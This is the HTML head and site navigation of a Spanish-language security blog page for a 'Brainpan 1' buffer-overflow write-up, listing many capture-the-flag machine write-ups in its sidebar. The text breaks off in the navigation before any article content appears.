<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href=/main.35c3ea08d4f2b16f64786716901e94ba1cde7a2003f17dea3c85090acdc8386aa9eea4af71348866c47f13039a34a042c86da4c8221e5062bc52819843cacbea.css integrity="sha512-NcPqCNTysW9keGcWkB6UuhzeeiAD8X3qPIUJCs3IOGqp7qSvcTSIZsR/EwOaNKBCyG2kyCIeUGK8UoGYQ8rL6g==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/vulnhub/brainpan-1/><title>Brainpan 1 | d3bo</title><meta name=description content="En esta máquina vamos a practicar el BoF (Buffer Overflow) más típico que suele caer en certificaciones como el eCPPT o el antiguo OSCP"><meta property="og:title" content="Brainpan 1"><meta property="og:description" content="En esta máquina vamos a practicar el BoF (Buffer Overflow) más típico que suele caer en certificaciones como el eCPPT o el antiguo OSCP"><meta property="og:type" content="article"><meta property="og:url" content="/writeups/vulnhub/brainpan-1/"><meta property="og:image" content="/writeups/vulnhub/brainpan-1/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2024-02-09T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-09T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/writeups/vulnhub/brainpan-1/cover.png"><meta name=twitter:title content="Brainpan 1"><meta name=twitter:description content="En esta máquina vamos a practicar el BoF (Buffer Overflow) más típico que suele caer en certificaciones como el eCPPT o el antiguo OSCP"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/vulnhub/","name":"Vuln Hub","position":3},{"@type":"ListItem","name":"Brainpan 1","position":4}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/ready>Ready</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/ready/><img src=/writeups/hackthebox/ready//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Ready</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Toolbox</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tabby</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wonderland</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=true>
VulnHub</button><div class="collapse show" id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3bo</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li><li class=nav-item><a class="nav-link active" href=/writeups/intro/bienvenido/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/about/>About</a></li><li class=nav-item><a class=nav-link href=/ctf/intro/bienvenido/>CTF</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/ready/><img src=/writeups/hackthebox/ready//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Ready</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Toolbox</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tabby</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" 